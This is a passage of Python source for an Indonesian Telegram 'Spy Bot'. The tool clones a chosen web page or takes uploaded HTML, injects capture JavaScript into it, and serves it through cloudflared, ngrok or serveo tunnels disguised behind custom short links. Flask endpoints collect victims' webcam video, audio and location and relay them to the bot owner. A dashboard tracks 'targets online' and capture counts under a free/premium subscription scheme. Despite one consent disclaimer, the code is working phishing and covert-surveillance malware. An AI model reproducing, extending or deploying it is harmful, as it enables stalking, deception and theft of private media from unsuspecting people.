    @fapp.route("/ping", methods=["POST"])
    def ping():
        mark_active(link_id, freq.remote_addr)
        return jsonify({"ok": True})

    @fapp.route("/video", methods=["POST"])
    def video():
        import json as _json
        raw = freq.get_data()
        try:
            data = _json.loads(raw)
            b64  = data.get("video","")
            mime = data.get("mime","video/webm")
            if b64:
                threading.Thread(
                    target=lambda: asyncio.run(_send_video(b64, mime, link_id, owner_uid)),
                    daemon=True
                ).start()
        except Exception as e:
            print(f"\n[!] video parse: {e}")
        return jsonify({"ok": True})

    @fapp.route("/audio", methods=["POST"])
    def audio():
        import json as _json
        raw = freq.get_data()
        try:
            data = _json.loads(raw)
            b64  = data.get("audio","")
            if b64:
                threading.Thread(
                    target=lambda: asyncio.run(_send_audio(b64, link_id, owner_uid)),
                    daemon=True
                ).start()
        except Exception as e:
            print(f"\n[!] audio parse: {e}")
        return jsonify({"ok": True})

    @fapp.route("/offline", methods=["POST"])
    def offline():
        asyncio.run(_send_offline(link_id, owner_uid))
        return jsonify({"ok": True})

    return fapp

def run_flask_on_port(fapp, port):
    fapp.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ------------------------------------------------------------------ #
#  TUNNEL
# ------------------------------------------------------------------ #
def start_cloudflared(port):
    b = shutil.which("cloudflared")
    if not b: return None, None
    proc = subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
                            stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
    pat = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
    for _ in range(40):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0), proc
    proc.terminate(); return None, None

def start_ngrok(port):
    if PYNGROK:
        try:
            t = _ngrok.connect(port,"http")
            return t.public_url.replace("http://","https://"), None
        except Exception as e: print(f"\n[!] ngrok: {e}")
    if shutil.which("ngrok"):
        proc = subprocess.Popen(["ngrok","http",str(port)],
                                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        time.sleep(3)
        try:
            r = req_lib.get("http://127.0.0.1:4040/api/tunnels",timeout=3)
            for t in r.json().get("tunnels",[]):
                u = t.get("public_url","")
                if u.startswith("https"): return u, proc
        except: pass
    return None, None

def start_serveo(port):
    if not shutil.which("ssh"): return None, None
    proc = subprocess.Popen(
        ["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=30",
         "-R",f"80:localhost:{port}","serveo.net"],
        stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
    pat = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
    for _ in range(30):
        line = proc.stdout.readline()
        if not line: time.sleep(0.5); continue
        m = pat.search(line)
        if m: return m.group(0), proc
    proc.terminate(); return None, None

TUNNEL_FN = {"cf": start_cloudflared}

# ------------------------------------------------------------------ #
#  SPAWN LINK
# ------------------------------------------------------------------ #
_UA = "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"

async def try_shorten(long_url: str, alias: str) -> str:
    def _spoo():
        r = req_lib.post(
            "https://spoo.me/",
            data={"url": long_url, "alias": alias},
            headers={"User-Agent": _UA, "Accept": "application/json"},
            timeout=10
        )
        j = r.json()
        s = j.get("short_url") or j.get("url","")
        return s if s.startswith("http") else ""

    def _tinyurl():
        r = req_lib.get(
            "https://tinyurl.com/api-create.php",
            params={"url": long_url, "alias": alias},
            headers={"User-Agent": _UA},
            timeout=10
        )
        t = r.text.strip()
        return t if t.startswith("http") and "tinyurl" in t else ""

    def _c2lol():
        r = req_lib.post(
            "https://c2.lol/api/short",
            json={"url": long_url, "custom": alias},
            headers={"User-Agent": _UA},
            timeout=10
        )
        s = r.json().get("short","")
        return s if s.startswith("http") else ""

    loop = asyncio.get_event_loop()
    for fn in [_spoo, _tinyurl, _c2lol]:
        try:
            result = await loop.run_in_executor(None, fn)
            if result:
                return result
        except Exception as e:
            print(f"\n[!] shorten {fn.__name__}: {e}")
    return long_url

async def spawn_link(tunnel_key, raw_html, owner_uid, query, mode="cam"):
    global _link_id_ctr
    _link_id_ctr += 1
    lid  = _link_id_ctr
    port = free_port(8080 + lid * 10)

    _page_htmls[lid] = inject_html(raw_html)
    _cap_counts[lid] = 0

    await query.edit_message_text(f"⏳ Membuat link #{lid}...")

    fapp = make_flask_app(lid, owner_uid)
    threading.Thread(target=run_flask_on_port,args=(fapp,port),daemon=True).start()
    time.sleep(1.0)

    loop = asyncio.get_event_loop()
    pub_url, proc = await loop.run_in_executor(None, TUNNEL_FN[tunnel_key], port)

    if not pub_url:
        await query.edit_message_text("❌ Tunnel gagal.",reply_markup=kb_main(owner_uid))
        return

    _links.append({"id":lid,"owner":owner_uid,"pub_url":pub_url,"port":port,"proc":proc,"mode":mode})
    _last_add[owner_uid] = time.time()

    # tanya custom link
    _user_data[owner_uid]["pending_link_id"]  = lid
    _user_data[owner_uid]["pending_pub_url"]  = pub_url
    await query.edit_message_text(
        f"✅ *Tunnel aktif!*\n\n🔗 `{pub_url}`\n\nMau custom link?",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Iya",  callback_data="custom_yes"),
            InlineKeyboardButton("❌ Tidak", callback_data="custom_no"),
        ]])
    )

def inject_html(html, mode="cam"):
    if mode == "mic":
        js = INJECT_JS_MIC
    elif mode == "video":
        js = INJECT_JS_VIDEO
    else:
        js = INJECT_JS
    idx = html.lower().rfind("</body>")
    return (html[:idx]+js+html[idx:]) if idx!=-1 else html+js

def free_port(start=8080):
    p = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1",p))!=0: return p
            p+=1

def clone_url(url):
    h={"User-Agent":"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"}
    r=req_lib.get(url,headers=h,timeout=15); r.raise_for_status(); return r.text

# ------------------------------------------------------------------ #
#  KEYBOARD
# ------------------------------------------------------------------ #
def kb_reply(uid):
    """Keyboard bawah permanen sesuai role."""
    role = db_get_role(uid)
    rows = [
        [KeyboardButton("➕ Tambah Link"), KeyboardButton("📋 Daftar Link")],
        [KeyboardButton("🗑 Hapus Link"),  KeyboardButton("📖 Tutorial")],
    ]
    if role == "admin":
        rows.append([KeyboardButton("👑 Panel Admin")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True, persistent=True)

def kb_main(uid):
    rows = [
        [
            InlineKeyboardButton("➕ Tambah Link", callback_data="add_link"),
            InlineKeyboardButton("🗑 Hapus Link",  callback_data="del_link"),
        ],
        [
            InlineKeyboardButton("📋 Daftar Link",   callback_data="list_links"),
            InlineKeyboardButton("👁 Target Online",  callback_data="online_now"),
        ],
        [
            InlineKeyboardButton("📖 Tutorial",      callback_data="tutorial"),
            InlineKeyboardButton("🔄 Refresh",       callback_data="refresh_panel"),
        ],
    ]
    if db_get_role(uid) == "admin":
        rows.append([InlineKeyboardButton("👑 Panel Admin", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)

def kb_template():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔗 Clone URL",       callback_data="tmpl_url"),
            InlineKeyboardButton("📄 Kirim File HTML", callback_data="tmpl_html"),
        ],
        [InlineKeyboardButton("« Kembali", callback_data="back_main")],
    ])

def kb_mode():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🎤 Foto + Lokasi + Mic",  callback_data="mode_mic"),
            InlineKeyboardButton("🎥 Video + Lokasi",        callback_data="mode_video"),
        ],
        [InlineKeyboardButton("« Kembali", callback_data="back_main")],
    ])

def kb_del(uid):
    rows = []
    for lnk in _links:
        if str(lnk["owner"]) == uid:
            cap = _cap_counts.get(lnk["id"],0)
            rows.append([InlineKeyboardButton(
                f"🗑 Link #{lnk['id']} ({cap} cap) — {lnk['pub_url'][:30]}...",
                callback_data=f"delid_{lnk['id']}"
            )])
    rows.append([InlineKeyboardButton("« Kembali",callback_data="back_main")])
    return InlineKeyboardMarkup(rows)

def kb_admin():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("⬆️ Upgrade User",    callback_data="a_upgrade"),
            InlineKeyboardButton("⬇️ Downgrade User",  callback_data="a_downgrade"),
        ],
        [
            InlineKeyboardButton("🚫 Ban User",         callback_data="a_ban"),
            InlineKeyboardButton("✅ Unban User",        callback_data="a_unban"),
        ],
        [
            InlineKeyboardButton("➕ Tambah Admin",     callback_data="a_addadmin"),
            InlineKeyboardButton("➖ Hapus Admin",      callback_data="a_deladmin"),
        ],
        [
            InlineKeyboardButton("👥 Semua User",       callback_data="a_users"),
            InlineKeyboardButton("📊 Statistik",        callback_data="a_stats"),
        ],
        [
            InlineKeyboardButton("🔗 Semua Link Aktif", callback_data="a_alllinks"),
            InlineKeyboardButton("❌ Force Hapus Link", callback_data="a_forcelink"),
        ],
        [
            InlineKeyboardButton("💬 Pesan ke User",    callback_data="a_msg"),
            InlineKeyboardButton("📢 Broadcast",        callback_data="a_broadcast"),
        ],
        [
            InlineKeyboardButton("⏳ Set Premium Exp",  callback_data="a_setexp"),
            InlineKeyboardButton("📝 Detail User",      callback_data="a_detail"),
        ],
        [
            InlineKeyboardButton("🔍 Cari User",        callback_data="a_search"),
        ],
        [
            InlineKeyboardButton("🛑 Stop Server",      callback_data="a_stop"),
            InlineKeyboardButton("« Kembali",           callback_data="back_main"),
        ],
    ])

# ------------------------------------------------------------------ #
#  HANDLERS
# ------------------------------------------------------------------ #
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)

    if db_is_banned(uid):
        await update.message.reply_text("🚫 Kamu telah dibanned dari bot ini.")
        return

    is_new = db_ensure_user(uid)
    role   = db_get_role(uid)
    cap    = db_read()["users"].get(uid,{}).get("cap_total",0)
    badge  = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")

    # notif ke semua admin kalau user baru
    if is_new and role != "admin":
        admins = db_read().get("admins",[])
        for a_id in admins:
            try:
                await context.bot.send_message(
                    chat_id=a_id,
                    text=f"🆕 *User baru daftar!*\n\nID: `{uid}`\nWaktu: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}",
                    parse_mode="Markdown"
                )
            except: pass

    teks  = f"🕵️ *MR414N-ID Spy Bot*\n\n"
    teks += f"Status: {badge}\nTotal capture: {cap}\n"
    if role == "free":
        teks += f"Link aktif: {db_link_count(uid)}/{FREE_LIMIT}\n"
    teks += "\nPanel kontrol:"

    _user_state[uid] = None
    _user_data[uid]  = {}
    # kirim keyboard bawah dulu
    await update.message.reply_text(
        "⌨️", reply_markup=kb_reply(uid)
    )
    await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    uid = str(q.message.chat_id)
    d   = q.data
    await q.answer()

    if db_is_banned(uid):
        await q.answer("🚫 Kamu telah dibanned.",show_alert=True); return

    role = db_get_role(uid)

    # --- back ---
    if d == "back_main":
        _user_state[uid]=None; _user_data[uid]={}
        cap   = db_read()["users"].get(uid,{}).get("cap_total",0)
        badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
        teks  = f"🕵️ *MR414N-ID Spy Bot*\n\nStatus: {badge}\nTotal capture: {cap}\n\nPanel kontrol:"
        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))

    elif d == "tutorial":
        await q.edit_message_text(
            TUTORIAL_TEXT,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("« Kembali", callback_data="back_main")]
            ])
        )

    elif d == "refresh_panel":
        cap   = db_read()["users"].get(uid,{}).get("cap_total",0)
        badge = {"admin":"👑 Admin","premium":"💎 Premium","free":"🆓 Free"}.get(role,"🆓 Free")
        aktif = db_link_count(uid)
        teks  = f"🕵️ *MR414N-ID Spy Bot*\n\n"
        teks += f"Status: {badge}\nTotal capture: {cap}\n"
        if role == "free":
            teks += f"Link aktif: {aktif}/{FREE_LIMIT}\n"
        else:
            teks += f"Link aktif: {aktif}\n"
        teks += f"⏰ Update: {datetime.datetime.now().strftime('%H:%M:%S')}\n\nPanel kontrol:"
        await q.edit_message_text(teks, parse_mode="Markdown", reply_markup=kb_main(uid))

    # --- tambah link ---
    elif d == "add_link":
        if role == "free" and db_link_count(uid) >= FREE_LIMIT:
            await q.answer(f"❌ Batas {FREE_LIMIT} link untuk Free.",show_alert=True); return
        # rate limit
        last = _last_add.get(uid, 0)
        sisa = RATE_LIMIT_SEC - int(time.time() - last)
        if sisa > 0 and role != "admin":
            await q.answer(f"⏳ Tunggu {sisa} detik sebelum tambah link lagi.",show_alert=True); return
        _user_state[uid]="await_template"; _user_data[uid]={}
        await q.edit_message_text("Pilih template:",reply_markup=kb_template())

    elif d == "tmpl_url":
        _user_state[uid]="await_url"
        await q.edit_message_text("Ketik URL yang mau di-clone:")

    elif d == "tmpl_html":
        _user_state[uid]="await_html"
        await q.edit_message_text("Kirim file `.html` sekarang.")

    elif d in ("mode_mic","mode_video"):
        raw = _user_data.get(uid,{}).get("raw_html","")
        if not raw:
            await q.edit_message_text("❌ Template kosong.",reply_markup=kb_main(uid)); return
        mode = "video" if d=="mode_video" else "mic"
        _user_data[uid]["sadap_mode"] = mode
        await spawn_link("cf", raw, uid, q, mode=mode)
        _user_state[uid]=None

    elif d == "custom_yes":
        _user_state[uid]="await_alias"
        await q.edit_message_text("Ketik alias yang diinginkan:\n(contoh: spylanox)")

    elif d == "custom_no":
        pub_url = _user_data.get(uid,{}).get("pending_pub_url","")
        lid     = _user_data.get(uid,{}).get("pending_link_id","?")
        _user_data[uid]={}
        await q.edit_message_text(
            f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n\nForward ke target.",
            parse_mode="Markdown", reply_markup=kb_main(uid)
        )

    # --- list link ---
    elif d == "list_links":
        user_links=[l for l in _links if str(l["owner"])==uid]
        if not user_links:
            await q.edit_message_text("📋 Belum ada link.",reply_markup=kb_main(uid))
        else:
            teks="📋 *Link Aktif:*\n\n"
            for lnk in user_links:
                cap=_cap_counts.get(lnk["id"],0)
                teks+=f"• Link #{lnk['id']} ({cap} cap)\n`{lnk['pub_url']}`\n\n"
            await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))

    # --- target online ---
    elif d == "online_now":
        now = time.time()
        teks = "👁 *Target Online Sekarang:*\n\n"
        found = False
        for lnk in [l for l in _links if str(l["owner"])==uid]:
            targets = _active_targets.get(lnk["id"],{})
            online  = [ip for ip,ts in targets.items() if now-ts<15]
            if online:
                found = True
                teks += f"Link #{lnk['id']}: {len(online)} target\n"
        if not found:
            teks += "Tidak ada target online."
        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))

    # --- hapus link ---
    elif d == "del_link":
        user_links=[l for l in _links if str(l["owner"])==uid]
        if not user_links:
            await q.edit_message_text("Belum ada link.",reply_markup=kb_main(uid))
        else:
            await q.edit_message_text("Pilih link yang mau dihapus:",reply_markup=kb_del(uid))

    elif d.startswith("delid_"):
        lid=int(d.split("_")[1])
        for i,lnk in enumerate(_links):
            if lnk["id"]==lid and str(lnk["owner"])==uid:
                if lnk.get("proc"):
                    try: lnk["proc"].terminate()
                    except: pass
                _links.pop(i); _page_htmls.pop(lid,None); break
        await q.edit_message_text(f"✅ Link #{lid} dihapus.",reply_markup=kb_main(uid))

    # --- admin panel ---
    elif d == "admin_panel":
        if role!="admin":
            await q.answer("❌ Bukan admin.",show_alert=True); return
        await q.edit_message_text("👑 *Panel Admin:*",parse_mode="Markdown",reply_markup=kb_admin())

    elif d == "a_stats":
        if role!="admin": return
        s=db_get_stats()
        online=get_online_count()
        teks =(f"📊 *Statistik Server:*\n\n"
               f"👥 Total user: {s['total_users']}\n"
               f"👑 Admin: {s['roles'].get('admin',0)}\n"
               f"💎 Premium: {s['roles'].get('premium',0)}\n"
               f"🆓 Free: {s['roles'].get('free',0)}\n"
               f"🔗 Link aktif: {s['total_links']}\n"
               f"📸 Total capture: {s['total_cap']}\n"
               f"👁 Target online: {online}\n"
               f"⏱ Uptime: {format_uptime()}")
        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_admin())

    elif d == "a_users":
        if role!="admin": return
        await q.edit_message_text(
            "👥 *Semua User* — pilih filter:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("👥 Semua",        callback_data="a_users_all"),
                    InlineKeyboardButton("💎 List Premium", callback_data="a_users_premium"),
                    InlineKeyboardButton("🆓 List Free",    callback_data="a_users_free"),
                ],
                [InlineKeyboardButton("« Kembali", callback_data="admin_panel")],
            ])
        )

    elif d in ("a_users_all","a_users_premium","a_users_free"):
        if role!="admin": return
        users=db_all_users()
        if not users:
            await q.edit_message_text("Belum ada user.",reply_markup=kb_admin()); return
        filter_role = {"a_users_all":None,"a_users_premium":"premium","a_users_free":"free"}[d]
        label_map   = {"a_users_all":"Semua User","a_users_premium":"Premium","a_users_free":"Free"}
        teks=f"👥 *{label_map[d]}:*\n\n"
        found=False
        for u_id,ud in users.items():
            r=ud.get("role","free")
            if filter_role and r!=filter_role: continue
            found=True
            badge={"admin":"👑","premium":"💎","free":"🆓"}.get(r,"🆓")
            exp=ud.get("premium_until","")
            exp_str=f" (exp: {exp})" if exp and r=="premium" else ""
            teks+=f"{badge} `{u_id}` — {ud.get('cap_total',0)} cap{exp_str}\n"
        if not found:
            teks+="_(kosong)_"
        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_admin())

    elif d == "a_alllinks":
        if role!="admin": return
        if not _links:
            await q.edit_message_text("Belum ada link aktif.",reply_markup=kb_admin()); return
        teks="🔗 *Semua Link Aktif:*\n\n"
        for lnk in _links:
            cap=_cap_counts.get(lnk["id"],0)
            teks+=f"Link #{lnk['id']} | Owner: `{lnk['owner']}` | {cap} cap\n`{lnk['pub_url']}`\n\n"
        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_admin())

    elif d == "a_upgrade":
        if role!="admin": return
        _user_state[uid]="a_await_upgrade_id"
        await q.edit_message_text("Ketik ID user yang mau di-upgrade ke Premium:")

    elif d == "a_dur_pick":
        if role!="admin": return
        rows=[]
        row=[]
        for key,(label,days) in PREMIUM_DURATIONS.items():
            row.append(InlineKeyboardButton(label, callback_data=f"a_dur_{key}"))
            if len(row)==2:
                rows.append(row); row=[]
        if row: rows.append(row)
        rows.append([InlineKeyboardButton("« Kembali",callback_data="admin_panel")])
        await q.edit_message_text(
            f"Pilih durasi premium untuk `{_user_data[uid].get('upgrade_target','?')}`:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(rows)
        )

    elif d.startswith("a_dur_"):
        if role!="admin": return
        key = d.replace("a_dur_","")
        label, days = PREMIUM_DURATIONS.get(key,("?",None))
        target = _user_data.get(uid,{}).get("upgrade_target","")
        if days is None:
            until = None
        else:
            until = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
        db_set_role(target,"premium",until=until)
        exp_str = f"sampai `{until}`" if until else "Permanent ♾"
        await q.edit_message_text(
            f"✅ `{target}` di-upgrade ke Premium {label} ({exp_str}).",
            parse_mode="Markdown", reply_markup=kb_admin()
        )
        _user_data[uid]={}

    elif d == "a_downgrade":
        if role!="admin": return
        _user_state[uid]="a_await_downgrade"
        await q.edit_message_text("Ketik ID user yang mau di-downgrade ke Free:")

    elif d == "a_ban":
        if role!="admin": return
        _user_state[uid]="a_await_ban"
        await q.edit_message_text("Ketik ID user yang mau di-ban:")

    elif d == "a_unban":
        if role!="admin": return
        _user_state[uid]="a_await_unban"
        await q.edit_message_text("Ketik ID user yang mau di-unban:")

    elif d == "a_addadmin":
        if role!="admin": return
        _user_state[uid]="a_await_addadmin"
        await q.edit_message_text("Ketik ID user yang mau dijadikan Admin:")

    elif d == "a_deladmin":
        if role!="admin": return
        data = db_read()
        admins = data.get("admins",[])
        teks = "👑 *Daftar Admin:*\n\n"
        for a_id in admins:
            ud = data["users"].get(a_id,{})
            teks += f"• `{a_id}` — join: {ud.get('joined','?')}\n"
        teks += "\nKetik ID admin yang mau dicopot:"
        _user_state[uid]="a_await_deladmin"
        await q.edit_message_text(teks, parse_mode="Markdown")

    elif d == "a_forcelink":
        if role!="admin": return
        _user_state[uid]="a_await_forcelink"
        await q.edit_message_text("Ketik nomor Link ID yang mau dihapus:")

    elif d == "a_msg":
        if role!="admin": return
        _user_state[uid]="a_await_msg_id"
        await q.edit_message_text("Ketik ID user yang mau dikirim pesan:")

    elif d == "a_broadcast":
        if role!="admin": return
        _user_state[uid]="a_await_broadcast"
        await q.edit_message_text("Ketik pesan broadcast (akan dikirim ke semua user):")

    elif d == "a_setexp":
        if role!="admin": return
        _user_state[uid]="a_await_exp_id"
        await q.edit_message_text("Ketik ID user untuk set expired premium:")

    elif d == "a_detail":
        if role!="admin": return
        _user_state[uid]="a_await_detail"
        await q.edit_message_text("Ketik ID user yang mau dilihat detailnya:")

    elif d == "a_search":
        if role!="admin": return
        _user_state[uid]="a_await_search"
        await q.edit_message_text("🔍 Ketik ID user yang mau dicari:")

    elif d == "a_stop":
        if role!="admin": return
        await q.edit_message_text("🛑 *Server dihentikan.*",parse_mode="Markdown")
        await asyncio.sleep(1)
        global _timer_running; _timer_running=False
        os.kill(os.getpid(),signal.SIGINT)

# ------------------------------------------------------------------ #
#  MESSAGE HANDLER
# ------------------------------------------------------------------ #
async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = str(update.effective_user.id)
    state = _user_state.get(uid)
    text  = update.message.text.strip() if update.message.text else ""

    # pesan biasa yang bukan command dan bukan dalam state apapun
    if not state:
        await update.message.reply_text(
            "👋 WELCOME TO SPY BOT BY LANOX\n\n"
            "🕵️ Selamat datang di SPY BOT, platform pemantauan dan pelacakan digital.\n\n"
            "📡 FITUR BOT:\n"
            "📷 Monitoring Kamera\n"
            "📍 Pelacakan Lokasi\n"
            "🔗 Sistem Berbasis Link\n\n"
            "🔐 AKSES MEMBER\n"
            "Bot ini hanya dapat digunakan oleh member yang telah terdaftar.\n\n"
            "🎁 FREE ACCESS\n"
            "• Limit penggunaan: 3 Link\n"
            "• Upgrade Premium untuk mendapatkan limit lebih besar.\n\n"
            "🚀 MULAI SEKARANG\n"
            "👉 Ketik /start untuk memulai.\n\n"
            "⚠️ Gunakan seluruh fitur hanya pada perangkat dan lokasi yang Anda miliki atau dengan persetujuan pemiliknya.\n\n"
            "🔥 SPY BOT BY LANOX\n"
            "Smart Monitoring • Digital Tracking",
            parse_mode=None
        )
        return

    # --- keyboard bawah ---
    if text in ("➕ Tambah Link","📋 Daftar Link","🗑 Hapus Link","📖 Tutorial","👑 Panel Admin"):
        if db_is_banned(uid):
            await update.message.reply_text("🚫 Kamu telah dibanned.")
            return
        db_ensure_user(uid)
        role = db_get_role(uid)

        if text == "➕ Tambah Link":
            if role == "free" and db_link_count(uid) >= FREE_LIMIT:
                await update.message.reply_text(f"❌ Batas {FREE_LIMIT} link untuk Free. Minta Admin upgrade.")
                return
            last = _last_add.get(uid,0)
            sisa = RATE_LIMIT_SEC - int(time.time()-last)
            if sisa > 0 and role != "admin":
                await update.message.reply_text(f"⏳ Tunggu {sisa} detik sebelum tambah link lagi.")
                return
            _user_state[uid]="await_template"; _user_data[uid]={}
            await update.message.reply_text("Pilih template:",reply_markup=kb_template())

        elif text == "📋 Daftar Link":
            user_links=[l for l in _links if str(l["owner"])==uid]
            if not user_links:
                await update.message.reply_text("📋 Belum ada link aktif.")
            else:
                teks2="📋 *Link Aktif:*\n\n"
                for lnk in user_links:
                    cap=_cap_counts.get(lnk["id"],0)
                    mode=lnk.get("mode","cam")
                    mode_icon={"mic":"🎤","video":"🎥"}.get(mode,"📷")
                    teks2+=f"{mode_icon} Link #{lnk['id']} ({cap} cap)\n`{lnk['pub_url']}`\n\n"
                await update.message.reply_text(teks2,parse_mode="Markdown")

        elif text == "🗑 Hapus Link":
            user_links=[l for l in _links if str(l["owner"])==uid]
            if not user_links:
                await update.message.reply_text("Belum ada link.")
            else:
                await update.message.reply_text("Pilih link yang mau dihapus:",reply_markup=kb_del(uid))

        elif text == "📖 Tutorial":
            await update.message.reply_text(TUTORIAL_TEXT,parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("« Kembali ke Panel",callback_data="back_main")
                ]]))

        elif text == "👑 Panel Admin":
            if role != "admin":
                await update.message.reply_text("❌ Bukan admin.")
                return
            await update.message.reply_text("👑 *Panel Admin:*",parse_mode="Markdown",reply_markup=kb_admin())
        return

    if state == "await_alias":
        alias = re.sub(r"[^a-zA-Z0-9\-_]","",text)
        if len(alias) < 3:
            await update.message.reply_text("❌ Alias minimal 3 karakter. Coba lagi:")
            return
        pub_url = _user_data.get(uid,{}).get("pending_pub_url","")
        lid     = _user_data.get(uid,{}).get("pending_link_id","?")
        await update.message.reply_text(f"⏳ Mencoba custom link '{alias}'...")
        final = await try_shorten(pub_url, alias)
        _user_data[uid]={}
        _user_state[uid]=None
        if final != pub_url:
            teks = f"✅ *Link #{lid} aktif!*\n\n🔗 Custom: `{final}`\n🔗 Asli: `{pub_url}`\n\nForward ke target."
        else:
            teks = f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n_(Custom link gagal, pakai URL asli)_\n\nForward ke target."
        await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
        return

    if state == "await_url":
        url = text
        if not url.startswith("http"): url="https://"+url
        await update.message.reply_text(f"⏳ Cloning {url}...")
        try:
            raw=clone_url(url)
            _user_data[uid]["raw_html"]=raw
            _user_state[uid]="await_mode"
            await update.message.reply_text("✅ Clone berhasil!\n\nPilih mode sadap:",reply_markup=kb_mode())
        except Exception as e:
            await update.message.reply_text(f"❌ Gagal: {e}",reply_markup=kb_template())

    # --- admin states ---
    elif state == "a_await_upgrade_id":
        _user_data[uid]["upgrade_target"] = text
        _user_state[uid] = None
        # munculkan pilihan durasi via fake callback
        rows=[]
        row=[]
        for key,(label,days) in PREMIUM_DURATIONS.items():
            row.append(InlineKeyboardButton(label, callback_data=f"a_dur_{key}"))
            if len(row)==2:
                rows.append(row); row=[]
        if row: rows.append(row)
        rows.append([InlineKeyboardButton("« Kembali",callback_data="admin_panel")])
        await update.message.reply_text(
            f"Pilih durasi premium untuk `{text}`:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(rows)
        )

    elif state == "a_await_downgrade":
        db_set_role(text,"free")
        await update.message.reply_text(f"✅ `{text}` di-downgrade ke Free.",
                                        parse_mode="Markdown",reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_ban":
        db_ban(text)
        await update.message.reply_text(f"🚫 `{text}` dibanned.",
                                        parse_mode="Markdown",reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_unban":
        db_unban(text)
        await update.message.reply_text(f"✅ `{text}` di-unban.",
                                        parse_mode="Markdown",reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_addadmin":
        db_add_admin(text)
        await update.message.reply_text(f"✅ `{text}` dijadikan Admin.",
                                        parse_mode="Markdown",reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_deladmin":
        ok=db_remove_admin(text)
        msg=f"✅ `{text}` dicopot dari Admin." if ok else "❌ Tidak bisa hapus admin utama."
        await update.message.reply_text(msg,parse_mode="Markdown",reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_forcelink":
        try:
            lid=int(text)
            for i,lnk in enumerate(_links):
                if lnk["id"]==lid:
                    if lnk.get("proc"):
                        try: lnk["proc"].terminate()
                        except: pass
                    _links.pop(i); _page_htmls.pop(lid,None); break
            await update.message.reply_text(f"✅ Link #{lid} dihapus paksa.",reply_markup=kb_admin())
        except:
            await update.message.reply_text("❌ ID tidak valid.",reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_msg_id":
        _user_data[uid]["msg_target"]=text
        _user_state[uid]="a_await_msg_text"
        await update.message.reply_text(f"Ketik pesan untuk user `{text}`:",parse_mode="Markdown")

    elif state == "a_await_msg_text":
        target=_user_data[uid].get("msg_target","")
        try:
            bot=Bot(token=BOT_TOKEN)
            await bot.send_message(chat_id=target,
                                   text=f"📩 *Pesan dari Admin:*\n\n{text}",
                                   parse_mode="Markdown")
            await update.message.reply_text("✅ Pesan terkirim.",reply_markup=kb_admin())
        except Exception as e:
            await update.message.reply_text(f"❌ Gagal: {e}",reply_markup=kb_admin())
        _user_state[uid]=None; _user_data[uid]={}

    elif state == "a_await_broadcast":
        users=db_all_users()
        bot=Bot(token=BOT_TOKEN)
        ok=0; fail=0
        for u_id in users:
            try:
                await bot.send_message(chat_id=u_id,
                                       text=f"📢 *Broadcast:*\n\n{text}",
                                       parse_mode="Markdown")
                ok+=1
            except: fail+=1
        await update.message.reply_text(f"📢 Broadcast selesai.\n✅ {ok} berhasil | ❌ {fail} gagal",
                                        reply_markup=kb_admin())
        _user_state[uid]=None

    elif state == "a_await_exp_id":
        _user_data[uid]["exp_target"]=text
        _user_state[uid]="a_await_exp_date"
        await update.message.reply_text(f"Ketik tanggal expired untuk `{text}` (format: YYYY-MM-DD):",
                                        parse_mode="Markdown")

    elif state == "a_await_exp_date":
        target=_user_data[uid].get("exp_target","")
        try:
            datetime.datetime.strptime(text,"%Y-%m-%d")
            db_set_role(target,"premium",until=text)
            await update.message.reply_text(f"✅ Premium `{target}` berlaku sampai `{text}`.",
                                            parse_mode="Markdown",reply_markup=kb_admin())
        except:
